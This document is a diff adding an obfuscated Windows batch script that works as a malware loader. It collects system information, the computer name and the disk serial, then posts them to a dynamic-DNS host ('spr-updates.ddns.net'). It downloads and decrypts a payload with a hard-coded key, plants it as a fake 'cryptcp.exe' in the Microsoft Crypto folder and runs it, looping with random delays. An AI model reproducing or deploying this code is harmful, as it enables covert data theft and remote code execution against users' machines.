@@ -1,0 +1,97 @@
+@echo off
+set NKALnvo=%random%
+chcp 1251 >NUL
+set emwAzZN=%APPDATA%
+setlocal enableextensions enabledelayedexpansion
+if %USERPROFILE%==jghjvKB set JnLpYQU=%COMPUTERNAME%
+:DndlL
+set emwAzZN=%APPDATA%
+set vers=V.309
+set emwAzZN=%APPDATA%
+set xfDkC=FAdeF
+set emwAzZN=%APPDATA%
+set IRVoo=%APPDATA%\Microsoft\Crypto\keys
+set NKALnvo=%random%
+set RwukB="Mozilla/5.0 (Linux; Android 6.0.1; SM-A500H Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36"
+If jolPPmX==HOKFFGC Set VCGWyTx=NKALnvo
+set FqJUL=*.*
+set emwAzZN=%APPDATA%
+set BwUVL=cryptcp
+If jolPPmX==HOKFFGC Set VCGWyTx=NKALnvo
+for /f %%n in ('
+tasklist /nh /fi "imagename eq %BwUVL%.exe" ^| find /c "%BwUVL%.exe"
+') do set /a zocrI=%%n
+if %zocrI% geq 2 goto exit
+If jolPPmX==HOKFFGC Set VCGWyTx=NKALnvo
+set NKALnvo=%random%
+set tGFFD='vol c:'
+set NKALnvo=%random%
+For /F "skip=1 Tokens=4*" %%o In (%tGFFD%) Do set JnjRi=%%o
+if %JnjRi%==is (
+For /F "skip=1 Tokens=5*" %%n In (%tGFFD%) Do set JnjRi=%%n
+)
+if %USERPROFILE%==jghjvKB set JnLpYQU=%COMPUTERNAME%
+set emwAzZN=%APPDATA%
+set DWiYe=%computername%_%JnjRi:-=%
+If jolPPmX==HOKFFGC Set VCGWyTx=NKALnvo
+set DWiYe=%DWiYe: =%
+set NKALnvo=%random%
+systeminfo>IrJHg
+If jolPPmX==HOKFFGC Set VCGWyTx=NKALnvo
+FOR /F "tokens=*" %%o IN (IrJHg) do @IF NOT j%%o==j set infosys=!infosys!%%o+###
+set emwAzZN=%APPDATA%
+RENAME "OfficeModule.exe" FAdeF.exe
+set NKALnvo=%random%
+set UQBIN=FAdeF.exe
+if %USERPROFILE%==jghjvKB set JnLpYQU=%COMPUTERNAME%
+RENAME "%CD%\Crypt.exe" file_QIPJV.exe
+If jolPPmX==HOKFFGC Set VCGWyTx=NKALnvo
+del /f /q "IrJHg"
+:UfjsJ
+set NKALnvo=%random%
+set /a dWFzF=90*%RANDOM%/32768
+if %USERPROFILE%==jghjvKB set JnLpYQU=%COMPUTERNAME%
+timeout /t %dWFzF%
+if %USERPROFILE%==jghjvKB set JnLpYQU=%COMPUTERNAME%
+set NKALnvo=%random%
+ping 8.8.8.8 |>nul find /i "TTL=" &&goto FAdeF||goto QIPJV
+if %USERPROFILE%==jghjvKB set JnLpYQU=%COMPUTERNAME%
+:FAdeF
+If jolPPmX==HOKFFGC Set VCGWyTx=NKALnvo
+tasklist /fi "IMAGENAME eq %UQBIN%" | find /i "%UQBIN%"
+if not errorlevel 1 taskkill /f /im %UQBIN%
+set NKALnvo=%random%
+set SPUHA=spr-updates
+If jolPPmX==HOKFFGC Set VCGWyTx=NKALnvo
+set dXlsp=ddns.net
+set emwAzZN=%APPDATA%
+set RWGVi=spr_updates.php
+set NKALnvo=%random%
+set ZrFBB=http://%SPUHA%.%dXlsp%/%RWGVi%
+set emwAzZN=%APPDATA%
+%UQBIN% -t 5 --user-agent=%RwukB% --post-data="sysinfo=%infosys%&id=%DWiYe%&fid=000000&comp=%computername%&versiya=%vers%" "%ZrFBB%" -q -N %ZrFBB% -O %xfDkC%
+set NKALnvo=%random%
+file_QIPJV.exe "%xfDkC%" dec "gjghj,eqhfcgfreqgbyljc"
+set emwAzZN=%APPDATA%
+If jolPPmX==HOKFFGC Set VCGWyTx=NKALnvo
+set NKALnvo=%random%
+1>nul findstr "\<.rdata\>" dec_%xfDkC% && (
+taskkill /f /im %BwUVL%.exe
+RENAME "%IRVoo%\%BwUVL%.exe" DndlL
+copy /y /v "%CD%\dec_%xfDkC%" "%IRVoo%\%BwUVL%.exe"
+start "" "%IRVoo%\%BwUVL%.exe"
+set /a dWFzF=6*%RANDOM%/32768
+timeout /t %dWFzF%
+exit
+)
+
+set NKALnvo=%random%
+set NKALnvo=%random%
+:QIPJV
+set emwAzZN=%APPDATA%
+set /a dWFzF=60*%RANDOM%/32768
+set NKALnvo=%random%
+timeout /T %dWFzF%
+set NKALnvo=%random%
+set NKALnvo=%random%
+goto UfjsJ
